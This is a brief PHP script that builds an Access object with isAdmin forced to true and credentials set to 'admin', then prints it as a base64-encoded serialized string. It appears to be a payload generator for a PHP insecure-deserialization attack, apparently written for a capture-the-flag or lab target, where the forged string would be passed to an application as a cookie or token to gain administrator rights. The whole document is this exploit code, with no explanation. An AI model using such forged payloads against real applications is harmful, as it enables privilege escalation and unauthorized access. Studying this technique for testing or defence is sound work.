<?php
class Access {
    protected $username;
    protected $role;
    protected $isAdmin;
    public $password;

    function __construct($user, $password) {
        $this->username = $user;
        $this->role = "regular";
        $this->password = $password;
        $this->isAdmin = true;
    }
}

$a = new Access("admin", "admin", []);
echo base64_encode(serialize($a));
?>
